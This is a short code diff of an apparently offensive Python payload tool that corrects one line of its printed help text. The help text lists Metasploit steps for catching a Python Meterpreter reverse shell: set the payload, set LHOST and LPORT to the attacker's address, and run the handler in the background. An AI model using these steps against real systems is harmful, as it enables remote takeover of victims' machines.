@@ -126,7 +126,7 @@ def enc():
             print(termcolor.colored("""
                 *********************************************
                     1. Start Metasploit-Frameowork
-                    2. use payload python/meterpreter/reverse_tcp
+                    2. set payload python/meterpreter/reverse_tcp
                     3. set LHOST       (your ip u set in start)
                     4. set LPORT       (your port u set in start)
                     5. exploit -j -z   
